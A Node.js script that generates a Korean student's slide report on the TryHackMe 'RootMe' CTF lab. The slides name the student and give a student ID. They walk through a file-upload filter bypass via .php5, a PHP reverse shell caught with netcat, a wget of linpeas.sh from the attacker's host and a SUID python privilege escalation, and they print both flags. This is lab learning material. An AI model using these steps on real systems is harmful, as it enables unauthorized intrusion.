import PptxGenJS from "pptxgenjs";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const IMG_DIR = "/Users/hongjunhwa/Downloads/칼리";
const OUT_PPT = path.join(__dirname, "RootMe_실습보고서_홍준화.pptx");

// 기존 파일 자동 백업
if (fs.existsSync(OUT_PPT)) {
  const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const backup = OUT_PPT.replace(".pptx", `_backup_${ts}.pptx`);
  fs.copyFileSync(OUT_PPT, backup);
  console.log(`📦 백업 저장: ${path.basename(backup)}`);
}

const prs = new PptxGenJS();
prs.layout = "LAYOUT_WIDE"; // 13.33 x 7.5 in

// ─── 제목 슬라이드 ─────────────────────────────────────────────────────────────
const t = prs.addSlide();
t.background = { color: "0d1117" };

t.addText("칼리 리눅스를 활용한 TryHackMe RootMe\n모의해킹 실습 보고서", {
  x: 0.8, y: 0.8, w: 11.73, h: 3.0,
  fontSize: 36, bold: true, color: "58a6ff",
  align: "center", valign: "middle", wrap: true,
});

t.addShape("rect", {
  x: 2.0, y: 3.95, w: 9.33, h: 0.05,
  fill: { type: "solid", color: "30363d" },
});

t.addText(
  "이  름:  홍준화          학  년:  4학년          학  번:  2026932014\n\n과  목:  XR프로젝트          제  출  일:  2026. 05. 01.",
  {
    x: 0.8, y: 4.1, w: 11.73, h: 2.5,
    fontSize: 20, color: "8b949e",
    align: "center", valign: "middle", wrap: true,
  }
);

// ─── 헬퍼 함수 ─────────────────────────────────────────────────────────────────
function addSlide(imgNum, stepTitle, desc) {
  const s = prs.addSlide();
  s.background = { color: "0d1117" }; // 다크 배경 (이미지 여백 자연스럽게)

  // contain: 이미지 전체가 항상 보임 (잘림 없음)
  s.addImage({
    path: path.join(IMG_DIR, `${imgNum}.png`),
    x: 0, y: 0, w: 13.33, h: 5.7,
    sizing: { type: "contain", w: 13.33, h: 5.7 },
  });

  // 상단 타이틀 배경
  s.addShape("rect", {
    x: 0, y: 0, w: 13.33, h: 0.54,
    fill: { type: "solid", color: "000000", transparency: 25 },
  });
  s.addText(stepTitle, {
    x: 0.15, y: 0.05, w: 13.0, h: 0.44,
    fontSize: 13, bold: true, color: "FFD700", valign: "middle",
  });

  // 하단 설명 배경
  s.addShape("rect", {
    x: 0, y: 5.7, w: 13.33, h: 1.8,
    fill: { type: "solid", color: "111827" },
  });
  s.addText(desc, {
    x: 0.2, y: 5.75, w: 12.93, h: 1.7,
    fontSize: 13, color: "FFFFFF", wrap: true, valign: "top",
  });
}

// ─── 82장 슬라이드 ─────────────────────────────────────────────────────────────
// ─── 환경 준비 (1~18) ────────────────────────────────────────────────────────
addSlide(1,  "Step 0  |  실습 환경 소개",
  "VirtualBox에서 실행 중인 Kali Linux 데스크탑입니다.\nKali Linux는 모의 해킹 전용 OS로 nmap, BurpSuite, netcat 등 보안 도구가 기본 설치되어 있습니다.");

addSlide(2,  "Step 0  |  브라우저 실행",
  "Kali Linux 내장 Firefox 브라우저를 열었습니다.\nTryHackMe 사이트에 접속해 VPN 연결 및 실습 환경을 설정합니다.");

addSlide(3,  "Step 0  |  TryHackMe 접속",
  "TryHackMe에 로그인한 메인 대시보드입니다.\n모의 해킹 실습용 가상 머신을 온라인으로 제공하는 학습 플랫폼입니다.");

addSlide(4,  "Step 1  |  프로필 메뉴 열기",
  "우측 상단 프로필 아이콘 클릭 → Settings로 이동합니다.\nVPN 연결을 위한 설정 페이지로 진입합니다.");

addSlide(5,  "Step 1  |  계정 설정 화면",
  "계정 General Information 페이지입니다.\n왼쪽 사이드바에서 'VM & VPN Settings' 항목을 클릭합니다.");

addSlide(6,  "Step 1  |  VM & VPN 설정",
  "Virtual Machines와 OpenVPN 설정 메뉴입니다.\nTryHackMe 실습 서버는 VPN 없이 접근할 수 없습니다.");

addSlide(7,  "Step 1  |  서버 지역 설정",
  "Virtual Machines 탭에서 서버 지역을 Asia Pacific으로 선택합니다.");

addSlide(8,  "Step 1  |  OpenVPN 설정 확인",
  "OpenVPN 서버: Asia Pacific (Mumbai), 아직 미연결 상태입니다.\n'.ovpn' 파일을 다운로드한 뒤 터미널에서 openvpn 명령으로 연결합니다.");

addSlide(9,  "Step 1  |  파일 관리자 열기",
  "Kali Linux 파일 관리자에서 VPN 파일을 저장할 폴더를 준비합니다.");

addSlide(10, "Step 1  |  .ovpn 파일 확인",
  "Downloads 폴더에 TryHackMe에서 받은 '.ovpn' VPN 설정 파일이 저장되어 있습니다.");

addSlide(11, "Step 2  |  RootMe 룸 검색",
  "TryHackMe 검색창에 'RootMe'를 입력합니다.\nRootMe는 웹 쉘 업로드와 SUID 권한 상승을 실습하는 초급 CTF 문제입니다.");

addSlide(12, "Step 2  |  RootMe 소개",
  "목표: 웹 서버에 악성 파일 업로드 → 리버스 쉘 획득 → root 권한 상승 → 플래그 2개 탈취.");

addSlide(13, "Step 2  |  가상 머신 시작",
  "'Start Machine' 버튼을 눌러 공격 대상 가상 머신을 배포합니다.\n시작까지 약 1~2분 소요됩니다.");

addSlide(14, "Step 2  |  머신 IP 주소 확인",
  "머신이 시작되면 공격 대상 IP 주소가 표시됩니다.\n이번 실습의 모든 공격 대상 주소이므로 반드시 메모합니다.");

addSlide(15, "Step 3  |  OpenVPN 연결",
  "터미널에서 'sudo openvpn [파일명].ovpn' 명령으로 VPN에 연결합니다.\n'Initialization Sequence Completed' 메시지가 나올 때까지 기다립니다.");

addSlide(16, "Step 3  |  OpenVPN 연결 중",
  "VPN 연결 로그가 출력됩니다. 완료 메시지가 나타날 때까지 터미널을 닫지 않습니다.");

addSlide(17, "Step 3  |  OpenVPN 연결 완료",
  "tun0 인터페이스와 라우팅 정보가 표시되면 VPN 연결 완료입니다.\nTryHackMe 실습 서버와 통신이 가능한 상태가 되었습니다.");

addSlide(18, "Step 3  |  작업 폴더 확인",
  "파일 관리자에서 THM > RootMe 폴더를 확인합니다.\n실습 파일들을 이 폴더에 정리해 둡니다.");

// ─── 정찰 (19~20) ────────────────────────────────────────────────────────────
addSlide(19, "Step 4  |  정찰 - nmap 스캔",
  "ping으로 서버 응답을 확인하고 'nmap -sV [IP]'로 포트 스캔을 실행합니다.\n열린 포트, 서비스 종류, 버전 정보를 수집합니다.");

addSlide(20, "Step 4  |  nmap 결과 - Task 2 완료",
  "결과: 22번(SSH), 80번(Apache 2.4.49) 포트 오픈.\n숨겨진 디렉터리 '/panel' 발견. Task 2 모든 답 입력 완료.");

// ─── BurpSuite 준비 (21~31) ───────────────────────────────────────────────────
addSlide(21, "Step 5  |  BurpSuite 실행",
  "앱 메뉴에서 BurpSuite를 검색해 실행합니다.\nBurpSuite는 HTTP 트래픽을 가로채고 수정할 수 있는 웹 프록시 도구입니다.");

addSlide(22, "Step 5  |  BurpSuite 시작",
  "'Temporary Project'를 선택하고 'Next → Start Burp'를 클릭합니다.");

addSlide(23, "Step 5  |  프로젝트 설정",
  "설정 파일 로드 화면입니다. 기본값으로 진행하고 'Start Burp'를 클릭합니다.");

addSlide(24, "Step 5  |  Intruder 탭 확인",
  "Intruder 탭입니다. 특정 파라미터 값을 자동 변경하며 반복 요청을 보내는 공격 자동화 도구입니다.");

addSlide(25, "Step 5  |  Proxy Intercept OFF",
  "Proxy 탭에서 Intercept를 OFF로 설정합니다.\nOFF 상태에서는 트래픽이 자동으로 통과되어 정상 브라우징이 가능합니다.");

addSlide(26, "Step 5  |  Proxy 리스너 설정",
  "127.0.0.1:8080에서 수신 대기 중인 Proxy Listener 설정 화면입니다.");

addSlide(27, "Step 5  |  내장 브라우저 설정",
  "Burp's browser 설정입니다. 내장 브라우저를 쓰면 별도 프록시 설정 없이 트래픽을 캡처할 수 있습니다.");

addSlide(28, "Step 5  |  샌드박스 없이 실행 허용",
  "'Allow Burp's browser to run without a sandbox' 옵션을 체크합니다.\nKali Linux에서 BurpSuite 내장 브라우저를 원활하게 사용하기 위한 설정입니다.");

addSlide(29, "Step 5  |  Intercept ON",
  "Intercept를 ON으로 켭니다.\n이제 브라우저의 모든 HTTP 요청이 BurpSuite에서 일시 중지되어 내용 확인·수정이 가능합니다.");

addSlide(30, "Step 5  |  What's New 팝업",
  "BurpSuite 업데이트 안내 팝업입니다. 'Close'를 눌러 닫고 계속 진행합니다.");

addSlide(31, "Step 5  |  캡처된 요청 확인",
  "Intercept ON 상태에서 캡처된 HTTP 요청이 표시됩니다.\n'Forward'로 서버에 전달하거나 내용을 수정해 전달할 수 있습니다.");

// ─── 파일 업로드 공격 (32~49) ────────────────────────────────────────────────
addSlide(32, "Step 6  |  공격 대상 웹사이트 접속",
  "공격 대상 IP의 웹사이트에 접속했습니다.\n'root@rootme:~# Can you root me?' — 파일 업로드 취약점을 이용해 침투합니다.");

addSlide(33, "Step 6  |  /panel/ 요청 → Intruder 전송",
  "HTTP History에서 POST /panel/ 요청 우클릭 → 'Send to Intruder'를 선택합니다.\nIntruder에서 파일 확장자를 자동 변경하며 업로드 필터 우회를 시도합니다.");

addSlide(34, "Step 6  |  /panel/ 업로드 페이지",
  "대상 서버 /panel/ 경로의 파일 업로드 폼입니다.\n'Choose File'로 파일을 선택하고 'Upload'로 업로드합니다.");

addSlide(35, "Step 6  |  업로드 요청 인터셉트",
  "파일 업로드 요청을 BurpSuite가 인터셉트했습니다.\nfilename 파라미터의 확장자 부분을 Intruder로 자동 변경해 필터를 우회합니다.");

addSlide(36, "Step 6  |  exploit.php 파일 준비",
  "THM/RootMe 폴더에 exploit.php(PHP 리버스 쉘)와 linpeas.sh가 준비되어 있습니다.\nexploit.php는 공격자 PC로 역방향 연결을 맺는 PHP 코드입니다.");

addSlide(37, "Step 6  |  exploit.php 선택",
  "/panel/ 업로드 폼에서 exploit.php를 선택했습니다.\n.php 확장자는 서버에서 차단되어 있어 바로 업로드하면 오류가 납니다.");

addSlide(38, "Step 6  |  요청 내용 확인",
  "BurpSuite에서 exploit.php 업로드 요청이 캡처되었습니다.\nfilename='exploit.php' 부분을 확인하고 이 요청을 Intruder로 전송합니다.");

addSlide(39, "Step 6  |  PHP 차단 확인",
  "서버 응답: 'PHP nao e permitido!' — PHP 확장자가 차단되었습니다.\nphp5 등 PHP 실행 가능한 다른 확장자로 필터를 우회해야 합니다.");

addSlide(40, "Step 6  |  Intruder 페이로드 설정",
  "Payloads 탭에 시도할 확장자 목록을 추가합니다: txt, css, html, java, php, php5\n각 확장자로 요청을 자동 반복해 서버 응답을 비교합니다.");

addSlide(41, "Step 6  |  Send to Intruder",
  "/panel/ POST 요청 우클릭 → 'Send to Intruder'.\nIntruder 탭에서 filename의 확장자 부분에 공격 위치(§)를 설정합니다.");

addSlide(42, "Step 6  |  요청 전문 확인",
  "Intruder에 전송된 요청 전문입니다. PHP 리버스 쉘 코드가 포함되어 있습니다.\n확장자 부분(exploit.§php§)에 § 마커를 설정합니다.");

addSlide(43, "Step 6  |  공격 위치(§) 설정",
  "filename='exploit.§php§' 처럼 확장자 부분을 § 마커로 감쌉니다.\nIntruder가 이 위치에 페이로드 목록을 하나씩 대입해 요청을 전송합니다.");

addSlide(44, "Step 6  |  페이로드 타입 설정",
  "Payload type을 'Simple list'로 설정하고 확장자 목록을 추가합니다.\ntxt, css, html, java, php, php5를 하나씩 입력합니다.");

addSlide(45, "Step 6  |  공격 시작",
  "'Start attack' 버튼을 클릭해 Intruder 공격을 시작합니다.\n각 확장자로 업로드 요청을 자동 반복 전송합니다.");

addSlide(46, "Step 6  |  공격 결과 - 응답 길이 비교",
  "결과 테이블의 Length(응답 길이)를 비교합니다.\n• php: 1111 (차단 메시지)   • php5: 1168 (성공 메시지)   → .php5로 필터 우회 성공!");

addSlide(47, "Step 6  |  php vs php5 응답 비교",
  "php(1111) vs php5(1168) — 길이 차이로 우회 가능한 확장자를 확인합니다.\n.php5는 PHP 코드로 실행되면서 서버 필터를 통과합니다.");

addSlide(48, "Step 6  |  php5 업로드 성공",
  "php5 응답: 'O arquivo foi upado com sucesso!' (업로드 성공!)\n../uploads/exploit.php5 경로에 리버스 쉘 파일이 업로드되었습니다.");

addSlide(49, "Step 6  |  php 차단 응답",
  "php 응답: 'PHP nao e permitido!' — .php는 차단됩니다.\n반면 .php5는 필터에 포함되지 않아 PHP 코드로 실행됩니다.");

// ─── 리버스 쉘 획득 (50~59) ───────────────────────────────────────────────────
addSlide(50, "Step 7  |  /uploads/ 접근",
  "http://[대상IP]/uploads/ 에 접속해 업로드된 파일 목록을 확인합니다.\nexploit.php5 클릭 전에 반드시 netcat 리스너를 먼저 실행해야 합니다!");

addSlide(51, "Step 7  |  업로드된 파일 목록",
  "Index of /uploads에 exploit.php5 등 파일이 올라가 있습니다.\n이 중 exploit.php5만 PHP 코드로 실행됩니다. 클릭 전 nc 리스너 먼저!");

addSlide(52, "Step 7  |  nc 리스너 실행 + 연결 수신",
  "'nc -lvnp [포트]' 명령으로 리스너를 실행합니다.\nexploit.php5를 클릭하면 대상 서버가 공격자 PC로 역방향 연결을 맺습니다.");

addSlide(53, "Step 7  |  리버스 쉘 연결 성공!",
  "bash-5.0$ 프롬프트 획득!\n대상 서버에 접근했습니다. uid=33(www-data) — 웹 서버 프로세스 권한입니다.");

addSlide(54, "Step 7  |  TTY 쉘 업그레이드",
  "'/bin/sh: can't access tty' 메시지가 보이면 쉘을 업그레이드합니다.\npython -c \"import pty; pty.spawn('/bin/bash')\" 명령으로 대화형 bash 쉘로 전환합니다.");

addSlide(55, "Step 7  |  bash 쉘 전환 완료",
  "python pty 명령 실행 후 bash-5.0$ 프롬프트로 전환되었습니다.\n안정적인 대화형 쉘로 이후 명령을 실행합니다.");

addSlide(56, "Step 8  |  user.txt 탐색",
  "find / -name user.txt 2>/dev/null 명령으로 user.txt 위치를 찾습니다.\n결과: /var/www/user.txt");

addSlide(57, "Step 8  |  첫 번째 플래그 획득!",
  "cd /var/www/ → ls → cat user.txt\n🏁 플래그: THM{y0u_g0t_a_sh3ll}");

addSlide(58, "Step 8  |  Task 3 정답 제출",
  "TryHackMe Task 3에 플래그 입력 → 'Correct Answer!' 확인.\nTask 3 'Getting a shell' 완료!");

addSlide(59, "Step 8  |  Task 3 완료",
  "Task 3의 모든 항목이 완료되었습니다.\n이제 Task 4 권한 상승(Privilege Escalation)으로 넘어갑니다.");

// ─── 권한 상승 준비 (60~74) ───────────────────────────────────────────────────
addSlide(60, "Step 9  |  LinPEAS 검색",
  "Google에서 'linpeas'를 검색합니다.\nLinPEAS는 Linux 권한 상승 취약점을 자동 탐색하는 쉘 스크립트입니다.");

addSlide(61, "Step 9  |  LinPEAS GitHub",
  "PEASS-ng GitHub 저장소의 linPEAS 설명 페이지입니다.\nSUID 파일, 잘못된 권한 등 권한 상승 가능한 항목을 자동 탐색합니다.");

addSlide(62, "Step 9  |  LinPEAS 실행 방법",
  "curl -L [URL] | sh 로 바로 실행하거나, 파일을 다운로드해 대상 서버로 전송합니다.");

addSlide(63, "Step 9  |  릴리즈 페이지",
  "Releases 페이지에서 linpeas.sh 다운로드 링크를 찾습니다.");

addSlide(64, "Step 9  |  링크 복사",
  "linpeas.sh 링크 우클릭 → '다른 이름으로 링크 저장' 또는 URL 복사.");

addSlide(65, "Step 9  |  curl로 다운로드",
  "칼리 터미널에서 'curl -L [URL] -o linpeas.sh' 명령으로 linpeas.sh를 다운로드합니다.");

addSlide(66, "Step 9  |  다운로드 진행 중",
  "linpeas.sh(1010KB) 다운로드 진행 중입니다.");

addSlide(67, "Step 9  |  HTTP 서버 실행",
  "다운로드 완료 후 'python3 -m http.server 5555'로 간이 HTTP 서버를 실행합니다.\n대상 서버에서 wget으로 이 서버에 접속해 linpeas.sh를 받습니다.");

addSlide(68, "Step 9  |  분할 화면",
  "왼쪽: HTTP 서버(5555 포트) / 오른쪽: 대상 서버 리버스 쉘\n두 터미널을 동시에 관리하며 파일 전송을 진행합니다.");

addSlide(69, "Step 9  |  전송 준비 완료",
  "HTTP 서버가 실행 중입니다.\n리버스 쉘(대상 서버)에서 wget 명령으로 linpeas.sh를 다운로드합니다.");

addSlide(70, "Step 9  |  대상 서버에서 wget",
  "cd /dev/shm (쓰기 가능한 메모리 임시 폴더)\nwget http://[공격자IP]:5555/linpeas.sh 명령으로 파일을 전송합니다.");

addSlide(71, "Step 9  |  linpeas.sh 전송 완료",
  "linpeas.sh(1010KB) 저장 완료.\n다음: chmod 777 linpeas.sh 명령으로 실행 권한을 부여합니다.");

addSlide(72, "Step 9  |  실행 권한 부여",
  "chmod 777 linpeas.sh 명령으로 실행 권한을 부여합니다.");

addSlide(73, "Step 9  |  LinPEAS 실행",
  "./linpeas.sh 명령으로 스크립트를 실행합니다.\n시스템 전체를 자동 검사하며 취약점을 색상으로 표시합니다.");

addSlide(74, "Step 9  |  스캔 결과 - SUID 발견!",
  "스캔 결과에서 SUID가 설정된 '/usr/bin/python' 발견!\n이 파일을 이용해 root 권한으로 상승할 수 있습니다.");

// ─── 권한 상승 (75~82) ────────────────────────────────────────────────────────
addSlide(75, "Step 10  |  GTFOBins 검색",
  "Google에서 'gtfobins'를 검색합니다.\nGTFOBins는 SUID·Sudo 권한을 가진 실행파일로 권한 상승하는 기법 모음 사이트입니다.");

addSlide(76, "Step 10  |  GTFOBins 홈페이지",
  "gtfobins.github.io 사이트입니다.\n실행파일 이름을 검색하면 권한 상승 명령어를 바로 확인할 수 있습니다.");

addSlide(77, "Step 10  |  python 검색",
  "GTFOBins에서 'python'을 검색합니다.\nShell, SUID 등 기법 목록 중 SUID 탭을 클릭합니다.");

addSlide(78, "Step 10  |  Python SUID 명령어",
  "SUID 섹션의 명령어:\npython -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n/usr/bin/python에 SUID가 설정되어 있으면 이 명령으로 root 쉘을 실행할 수 있습니다.");

addSlide(79, "Step 10  |  root 권한 획득!",
  "/usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' 실행!\n프롬프트: bash-5.0$ → #   → root 권한 획득 성공!");

addSlide(80, "Step 11  |  root.txt 탐색",
  "find / -name root.txt 2>/dev/null\n결과: /root/root.txt");

addSlide(81, "Step 11  |  최종 플래그 획득!",
  "cat /root/root.txt 명령으로 최종 플래그를 읽습니다.\nroot 권한으로 root.txt 획득 완료!");

addSlide(82, "🏆 완료  |  Task 4 정답 제출!",
  "TryHackMe RootMe 완전 클리어!\n• SUID: /usr/bin/python   • 방법: python   • 플래그: THM{pr1v1l3g3_3sc4l4t10n_t3chniques_4re_4mazing}");

// ─── 마무리 슬라이드 ───────────────────────────────────────────────────────────
const closing = prs.addSlide();
closing.background = { color: "0d1117" };

closing.addText("실습 후기 및 배운 점", {
  x: 0.8, y: 0.4, w: 11.73, h: 0.85,
  fontSize: 30, bold: true, color: "58a6ff",
  align: "center", valign: "middle",
});

closing.addShape("rect", {
  x: 2.0, y: 1.35, w: 9.33, h: 0.04,
  fill: { type: "solid", color: "30363d" },
});

closing.addText("배운 점", {
  x: 0.6, y: 1.55, w: 5.6, h: 0.45,
  fontSize: 16, bold: true, color: "FFD700",
});
closing.addShape("rect", {
  x: 0.6, y: 2.0, w: 5.8, h: 3.6,
  fill: { type: "solid", color: "161b22" },
});
closing.addText(
  "• nmap 포트 스캔을 통해 서버의 열린 포트와\n   서비스 버전을 파악하는 정찰 기법을 익혔다.\n\n" +
  "• BurpSuite Intruder를 이용해 파일 업로드\n   필터를 자동으로 우회하는 방법을 배웠다.\n\n" +
  "• PHP 리버스 쉘을 통해 대상 서버의 쉘을\n   획득하는 실전 공격 흐름을 이해했다.\n\n" +
  "• LinPEAS로 SUID 취약점을 탐지하고\n   GTFOBins를 활용해 권한 상승하는 방법을\n   직접 실습했다.",
  { x: 0.75, y: 2.1, w: 5.5, h: 3.4, fontSize: 13, color: "c9d1d9", wrap: true, valign: "top" }
);

closing.addText("느낀 점", {
  x: 7.0, y: 1.55, w: 5.6, h: 0.45,
  fontSize: 16, bold: true, color: "56d364",
});
closing.addShape("rect", {
  x: 7.0, y: 2.0, w: 5.73, h: 3.6,
  fill: { type: "solid", color: "161b22" },
});
closing.addText(
  "이번 RootMe 실습을 통해 실제 모의 해킹의\n전체 흐름을 처음부터 끝까지 경험해 볼 수\n있었다.\n\n" +
  "단순히 이론으로만 알고 있던 리버스 쉘,\n권한 상승 같은 개념들을 직접 손으로 실행\n해보니 훨씬 깊이 이해할 수 있었다.\n\n" +
  "특히 php5 확장자 우회처럼 공격자가 사소한\n서버 설정 허점을 어떻게 이용하는지 느꼈고,\n보안 설정의 중요성을 다시 한번 깨달았다.\n\n" +
  "앞으로 더 어려운 CTF 문제에도 도전해보고\n싶다는 동기가 생겼다.",
  { x: 7.15, y: 2.1, w: 5.43, h: 3.4, fontSize: 13, color: "c9d1d9", wrap: true, valign: "top" }
);

closing.addText("TryHackMe RootMe  |  XR프로젝트  |  홍준화  |  2026. 05. 01.", {
  x: 0.8, y: 6.9, w: 11.73, h: 0.4,
  fontSize: 11, color: "484f58", align: "center",
});

// ─── PPT 저장 ─────────────────────────────────────────────────────────────────
await prs.writeFile({ fileName: OUT_PPT });
console.log(`\n✅ 완료: ${OUT_PPT}`);
console.log(`   총 슬라이드: 84장 (제목 1 + 실습 82 + 마무리 1)`);
